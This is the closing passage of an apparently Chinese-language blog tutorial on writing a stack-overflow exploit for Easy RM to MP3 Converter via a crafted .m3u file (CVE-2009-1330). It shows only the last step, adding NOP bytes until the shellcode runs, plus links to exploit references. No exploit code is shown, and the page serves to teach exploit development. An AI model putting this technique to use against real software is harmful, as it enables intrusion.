<p>&emsp;重新生成m3u文件，重载EasyRMtoMP3Converter.exe<br><img src="/2017/02/28/CVE-2009-1330-m3u-Exploit/8.png"><br>&emsp;发现nops字节数仍然不够，那么再增加4个\x90<br>&emsp;ShellCode成功执行<br><img src="/2017/02/28/CVE-2009-1330-m3u-Exploit/9.gif">  </p>
<p><strong>0x06.参考资料</strong><br>&emsp;Corelan Team:<a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/" target="_blank" rel="noopener">https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/</a><br>&emsp;Pocket Strom:<a href="https://packetstormsecurity.com/files/101960/Easy-RM-to-MP3-Converter-2.7.3.700-Stack-Buffer-Overflow.html" target="_blank" rel="noopener">https://packetstormsecurity.com/files/101960/Easy-RM-to-MP3-Converter-2.7.3.700-Stack-Buffer-Overflow.html</a><br>&emsp;Exploit-DB: <a href="https://www.exploit-db.com/exploits/10374/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/10374/</a><br>&emsp;Marcelo Carvalho:  <a href="https://www.youtube.com/watch?v=aEZKGW_VTd4&amp;t=181s" target="_blank" rel="noopener">https://www.youtube.com/watch?v=aEZKGW_VTd4&amp;t=181s</a></p>

  </div>
</article>



    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/projects_url">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2017/02/28/CVE-2009-1330-m3u-Exploit/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2017/02/28/CVE-2009-1330-m3u-Exploit/&text=EasyRMtoMP3 Converter  &#39;.m3u&#39;格式转换栈溢出之利用编写"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2017/02/28/CVE-2009-1330-m3u-Exploit/&title=EasyRMtoMP3 Converter  &#39;.m3u&#39;格式转换栈溢出之利用编写"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2017/02/28/CVE-2009-1330-m3u-Exploit/&is_video=false&description=EasyRMtoMP3 Converter  &#39;.m3u&#39;格式转换栈溢出之利用编写"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=EasyRMtoMP3 Converter  &#39;.m3u&#39;格式转换栈溢出之利用编写&body=Check out this article: http://yoursite.com/2017/02/28/CVE-2009-1330-m3u-Exploit/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2017/02/28/CVE-2009-1330-m3u-Exploit/&title=EasyRMtoMP3 Converter  &#39;.m3u&#39;格式转换栈溢出之利用编写"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2017/02/28/CVE-2009-1330-m3u-Exploit/&title=EasyRMtoMP3 Converter  &#39;.m3u&#39;格式转换栈溢出之利用编写"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2017/02/28/CVE-2009-1330-m3u-Exploit/&title=EasyRMtoMP3 Converter  &#39;.m3u&#39;格式转换栈溢出之利用编写"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2017/02/28/CVE-2009-1330-m3u-Exploit/&title=EasyRMtoMP3 Converter  &#39;.m3u&#39;格式转换栈溢出之利用编写"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2017/02/28/CVE-2009-1330-m3u-Exploit/&name=EasyRMtoMP3 Converter  &#39;.m3u&#39;格式转换栈溢出之利用编写&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2019 Kasymobv Lee
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/projects_url">Projects</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
<!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

<!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

<!-- Disqus Comments -->


